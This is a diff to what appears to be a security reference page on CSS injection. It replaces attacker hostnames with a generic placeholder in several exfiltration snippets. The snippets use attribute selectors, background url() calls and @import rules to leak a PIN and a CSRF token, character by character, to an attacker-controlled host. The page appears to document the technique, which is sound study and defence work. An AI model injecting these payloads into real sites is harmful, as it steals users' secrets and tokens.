@@ -47,7 +47,7 @@ input[value^="TOKEN_012"] {
 
 ```css
 input[name="pin"][value="1234"] {
-  background: url(https://attacker.com/log?pin=1234);
+  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);
 }
 ```
 
@@ -57,7 +57,7 @@ input[name="pin"][value="1234"] {
 
 ```css
 input[name="csrf-token"][value^="a"] + input {
-  background: url(https://example.com?q=a)
+  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)
 }
 ```
 
@@ -76,8 +76,8 @@ div:has(input[value="1337"]) {
 This technique is known as **Blind CSS Exfiltration**. It relies on importing external stylesheets to trigger callbacks.
 
 ```html
-<style>@import url(http://attacker.com/staging?len=32);</style>
-<style>@import'//YOUR-PAYLOAD.oastify.com'</style>
+<style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>
+<style>@import'//[ATTACKER.DOMAIN.TLD]'</style>
 ```
 
 Frames do not always need to be reloaded to reevaluate CSS. The `@import` rule allows for latency; the browser will process the import and apply the new styles.
